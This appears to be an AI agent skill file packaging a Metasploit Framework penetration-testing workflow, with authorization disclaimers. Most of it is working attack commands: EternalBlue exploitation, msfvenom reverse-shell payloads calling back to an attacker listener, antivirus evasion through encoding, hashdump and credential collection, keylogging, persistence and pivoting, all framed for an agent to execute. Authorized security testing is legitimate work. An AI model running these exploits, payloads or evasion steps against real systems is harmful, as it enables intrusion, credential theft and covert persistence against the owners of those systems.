---
name: metasploit-framework
description: "Metasploit Framework workflow skill. Use this skill when the user needs \u26a0\ufe0f AUTHORIZED USE ONLY > This skill is for educational purposes or authorized security assessments only. > You must have explicit, written permission from the system owner before using this tool. > Misuse of this tool is illegal and strictly prohibited and the operator should preserve the upstream workflow, copied support files, and provenance before merging or handing off."
version: "0.0.1"
category: testing-security
tags: ["metasploit-framework", "authorized", "use", "only", "for", "educational", "purposes", "security"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-15"
date_updated: "2026-04-18"
---

# Metasploit Framework

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills-claude/skills/metasploit-framework` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

This intake keeps the copied upstream files intact and uses `metadata.json` plus `ORIGIN.md` as the provenance anchor for review.

# Metasploit Framework > ⚠️ AUTHORIZED USE ONLY > This skill is for educational purposes or authorized security assessments only. > You must have explicit, written permission from the system owner before using this tool. > Misuse of this tool is illegal and strictly prohibited.

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Prerequisites, Outputs and Deliverables, Constraints and Limitations.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: ⚠️ AUTHORIZED USE ONLY > This skill is for educational purposes or authorized security assessments only. > You must have explicit, written permission from the system owner before using this tool. > Misuse of this tool....
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when copied upstream references, examples, or scripts materially improve the answer.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `metadata.json` | Confirms repository, branch, commit, and imported path before touching the copied workflow |
| Provenance review | `ORIGIN.md` | Gives reviewers a plain-language audit trail for the imported source |
| Workflow execution | `SKILL.md` | Starts with the smallest copied file that materially changes execution |
| Supporting context | `SKILL.md` | Adds the next most relevant copied source file without loading the entire package |
| Handoff decision | `## Related Skills` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. ### Phase 1: MSFConsole Basics Launch and navigate the Metasploit console: bash # Start msfconsole msfconsole # Quiet mode (skip banner) msfconsole -q # Basic navigation commands msf6 > help # Show all commands msf6 > search [term] # Search modules msf6 > use [module] # Select module msf6 > info # Show module details msf6 > show options # Display required options msf6 > set [OPTION] [value] # Configure option msf6 > run / exploit # Execute module msf6 > back # Return to main console msf6 > exit # Exit msfconsole ### Phase 2: Module Types Understand the different module categories: bash # 1.
2. Exploit Modules - Target specific vulnerabilities msf6 > show exploits msf6 > use exploit/windows/smb/ms17010eternalblue # 2.
3. Payload Modules - Code executed after exploitation msf6 > show payloads msf6 > set PAYLOAD windows/x64/meterpreter/reversetcp # 3.
4. Auxiliary Modules - Scanning, fuzzing, enumeration msf6 > show auxiliary msf6 > use auxiliary/scanner/smb/smbversion # 4.
5. Post-Exploitation Modules - Actions after compromise msf6 > show post msf6 > use post/windows/gather/hashdump # 5.
6. Encoders - Obfuscate payloads msf6 > show encoders msf6 > set ENCODER x86/shikataganai # 6.
7. Nops - No-operation padding for buffer overflows msf6 > show nops # 7.

### Imported Workflow Notes

#### Imported: Core Workflow

### Phase 1: MSFConsole Basics

Launch and navigate the Metasploit console:

```bash
# Start msfconsole
msfconsole

# Quiet mode (skip banner)
msfconsole -q

# Basic navigation commands
msf6 > help                    # Show all commands
msf6 > search [term]           # Search modules
msf6 > use [module]            # Select module
msf6 > info                    # Show module details
msf6 > show options            # Display required options
msf6 > set [OPTION] [value]    # Configure option
msf6 > run / exploit           # Execute module
msf6 > back                    # Return to main console
msf6 > exit                    # Exit msfconsole
```

### Phase 2: Module Types

Understand the different module categories:

```bash
# 1. Exploit Modules - Target specific vulnerabilities
msf6 > show exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Payload Modules - Code executed after exploitation
msf6 > show payloads
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Auxiliary Modules - Scanning, fuzzing, enumeration
msf6 > show auxiliary
msf6 > use auxiliary/scanner/smb/smb_version

# 4. Post-Exploitation Modules - Actions after compromise
msf6 > show post
msf6 > use post/windows/gather/hashdump

# 5. Encoders - Obfuscate payloads
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai

# 6. Nops - No-operation padding for buffer overflows
msf6 > show nops

# 7. Evasion - Bypass security controls
msf6 > show evasion
```

### Phase 3: Searching for Modules

Find appropriate modules for targets:

```bash
# Search by name
msf6 > search eternalblue

# Search by CVE
msf6 > search cve:2017-0144

# Search by platform
msf6 > search platform:windows type:exploit

# Search by type and keyword
msf6 > search type:auxiliary smb

# Filter by rank (excellent, great, good, normal, average, low, manual)
msf6 > search rank:excellent

# Combined search
msf6 > search type:exploit platform:linux apache

# View search results columns:
# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description
```

### Phase 4: Configuring Exploits

Set up an exploit for execution:

```bash
# Select exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target host
msf6 exploit(...) > set RHOSTS 192.168.1.100

# Set target port (if different from default)
msf6 exploit(...) > set RPORT 445

# View compatible payloads
msf6 exploit(...) > show payloads

# Set payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local host for reverse connection
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# View all options again to verify
msf6 exploit(...) > show options

# Check if target is vulnerable (if supported)
msf6 exploit(...) > check

# Execute exploit
msf6 exploit(...) > exploit
# or
msf6 exploit(...) > run
```

### Phase 5: Payload Types

Select appropriate payload for the situation:

```bash
# Singles - Self-contained, no staging
windows/shell_reverse_tcp
linux/x86/shell_bind_tcp

# Stagers - Small payload that downloads larger stage
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp

# Stages - Downloaded by stager, provides full functionality
# Meterpreter, VNC, shell

# Payload naming convention:
# [platform]/[architecture]/[payload_type]/[connection_type]
# Examples:
windows/x64/meterpreter/reverse_tcp
linux/x86/shell/bind_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_https
android/meterpreter/reverse_tcp
```

### Phase 6: Meterpreter Session

Work with Meterpreter post-exploitation:

```bash
# After successful exploitation, you get Meterpreter prompt
meterpreter >

# System Information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# File System Operations
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download file.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\

# Process Management
meterpreter > ps
meterpreter > migrate [PID]
meterpreter > kill [PID]

# Networking
meterpreter > ipconfig
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Privilege Escalation
meterpreter > getsystem
meterpreter > getprivs

# Credential Harvesting
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Screenshots and Keylogging
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Shell Access
meterpreter > shell
C:\Windows\system32> whoami
C:\Windows\system32> exit
meterpreter >

# Background Session
meterpreter > background
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```

### Phase 7: Auxiliary Modules

Use auxiliary modules for reconnaissance:

```bash
# SMB Version Scanner
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Port Scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set PORTS 1-1000
msf6 auxiliary(...) > run

# SSH Version Scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# FTP Anonymous Login
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# HTTP Directory Scanner
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Brute Force Modules
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```

### Phase 8: Post-Exploitation Modules

Run post modules on active sessions:

```bash
# List sessions
msf6 > sessions -l

# Run post module on specific session
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(...) > run

# Or run directly from Meterpreter
meterpreter > run post/windows/gather/hashdump

# Common Post Modules
# Credential Gathering
post/windows/gather/credentials/credential_collector
post/windows/gather/lsa_secrets
post/windows/gather/cachedump
post/multi/gather/ssh_creds

# System Enumeration
post/windows/gather/enum_applications
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_shares
post/linux/gather/enum_configs

# Privilege Escalation
post/windows/escalate/getsystem
post/multi/recon/local_exploit_suggester

# Persistence
post/windows/manage/persistence_exe
post/linux/manage/sshkey_persistence

# Pivoting
post/multi/manage/autoroute
```

### Phase 9: Payload Generation with msfvenom

Create standalone payloads:

```bash
# Basic Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# WAR file (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk

# Encoded payload (evade AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List available formats
msfvenom --list formats

# List available encoders
msfvenom --list encoders
```

### Phase 10: Setting Up Handlers

Configure listener for incoming connections:

```bash
# Manual handler setup
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# The -j flag runs as background job
msf6 > jobs -l

# When payload executes on target, session opens
[*] Meterpreter session 1 opened

# Interact with session
msf6 > sessions -i 1
```

#### Imported: Purpose

Leverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @metasploit-framework to handle <task>. Start from the copied upstream workflow, load only the files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Ask for a provenance-grounded review

```text
Review @metasploit-framework against metadata.json and ORIGIN.md, then explain which copied upstream files you would load first and why.
```

**Explanation:** Use this before review or troubleshooting when you need a precise, auditable explanation of origin and file selection.

### Example 3: Narrow the copied support files before execution

```text
Use @metasploit-framework for <task>. Load only the copied references, examples, or scripts that change the outcome, and name the files explicitly before proceeding.
```

**Explanation:** This keeps the skill aligned with progressive disclosure instead of loading the whole copied package by default.

### Example 4: Build a reviewer packet

```text
Review @metasploit-framework using the copied upstream files plus provenance, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.



## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The goal is to keep provenance explicit and load only the copied source material that materially improves execution.

- Keep the imported skill grounded in the upstream repository; do not invent steps that the source material cannot support.
- Prefer the smallest useful set of support files so the workflow stays auditable and fast to review.
- Keep provenance, source commit, and imported file paths visible in notes and PR descriptions.
- Point directly at the copied upstream files that justify the workflow instead of relying on generic review boilerplate.
- Treat generated examples as scaffolding; adapt them to the concrete task before execution.
- Route to a stronger native skill when architecture, debugging, design, or security concerns become dominant.



## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/metasploit-framework`, fails to mention provenance, or does not use any copied source files at all.
**Solution:** Re-open `metadata.json`, `ORIGIN.md`, and the most relevant copied upstream files. Load only the files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Point at the exact copied references, examples, scripts, or assets that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Database not connected | Run `sudo msfdb init`, start PostgreSQL, then `db_connect` |
| Exploit fails/no session | Run `check`; verify payload architecture; check firewall; try different payloads |
| Session dies immediately | Migrate to stable process; use stageless payload; check AV; use AutoRunScript |
| Payload detected by AV | Use encoding `-e x86/shikata_ga_nai -i 10`; use evasion modules; custom templates |

## Related Skills

- `@lint-and-validate` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@linux-shell-scripting` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@linux-troubleshooting` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@llm-app-patterns` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operator packet for this imported skill. They should reflect real copied source material, not generic scaffolding.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | copied reference notes, guides, or background material from upstream | `references/n/a` |
| `examples` | worked examples or reusable prompts copied from upstream | `examples/n/a` |
| `scripts` | upstream helper scripts that change execution or validation | `scripts/n/a` |
| `agents` | routing or delegation notes that are genuinely part of the imported package | `agents/n/a` |
| `assets` | supporting assets or schemas copied from the source package | `assets/n/a` |



### Imported Reference Notes

#### Imported: Quick Reference

### Essential MSFConsole Commands

| Command | Description |
|---------|-------------|
| `search [term]` | Search for modules |
| `use [module]` | Select a module |
| `info` | Display module information |
| `show options` | Show configurable options |
| `set [OPT] [val]` | Set option value |
| `setg [OPT] [val]` | Set global option |
| `run` / `exploit` | Execute module |
| `check` | Verify target vulnerability |
| `back` | Deselect module |
| `sessions -l` | List active sessions |
| `sessions -i [N]` | Interact with session |
| `jobs -l` | List background jobs |
| `db_nmap` | Run nmap with database |

### Meterpreter Essential Commands

| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `getsystem` | Attempt privilege escalation |
| `hashdump` | Dump password hashes |
| `shell` | Drop to system shell |
| `upload/download` | File transfer |
| `screenshot` | Capture screen |
| `keyscan_start` | Start keylogger |
| `migrate [PID]` | Move to another process |
| `background` | Background session |
| `portfwd` | Port forwarding |

### Common Exploit Modules

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms08_067_netapi
exploit/windows/http/iis_webdav_upload_asp
exploit/windows/local/bypassuac

# Linux
exploit/linux/ssh/sshexec
exploit/linux/local/overlayfs_priv_esc
exploit/multi/http/apache_mod_cgi_bash_env_exec

# Web Applications
exploit/multi/http/tomcat_mgr_upload
exploit/unix/webapp/wp_admin_shell_upload
exploit/multi/http/jenkins_script_console
```

#### Imported: Prerequisites

### Required Tools
```bash
# Metasploit must already be installed before using this skill.
# Kali Linux usually ships with it preinstalled.
msfconsole --version
```

Installation varies by operating system and package source. Follow your platform's documented package-manager or vendor installation process before using this skill. Do not rely on an unpinned remote installer script from inside this skill.

If you want database-backed features such as workspace tracking, initialize `msfdb` using the instructions for your local installation. This skill assumes Metasploit is already available and does not require `sudo`, `systemctl`, or other privileged host-level setup steps.

### Required Knowledge
- Network and system fundamentals
- Understanding of vulnerabilities and exploits
- Basic programming concepts
- Target enumeration techniques

### Required Access
- Written authorization for testing
- Network access to target systems
- Understanding of scope and rules of engagement

Before running exploit modules, ask the user to confirm the exact target host, scope, and authorization state.

#### Imported: Outputs and Deliverables

1. **Exploitation Evidence** - Screenshots and logs of successful compromises
2. **Session Logs** - Command history and extracted data
3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references
4. **Post-Exploitation Artifacts** - Credentials, files, and system information

#### Imported: Constraints and Limitations

### Legal Requirements
- Only use on systems you own or have written authorization to test
- Document all testing activities
- Follow rules of engagement
- Report all findings to appropriate parties

### Technical Limitations
- Modern AV/EDR may detect Metasploit payloads
- Some exploits require specific target configurations
- Firewall rules may block reverse connections
- Not all exploits work on all target versions

### Operational Security
- Use encrypted channels (reverse_https) when possible
- Clean up artifacts after testing
- Avoid detection by monitoring systems
- Limit post-exploitation to agreed scope
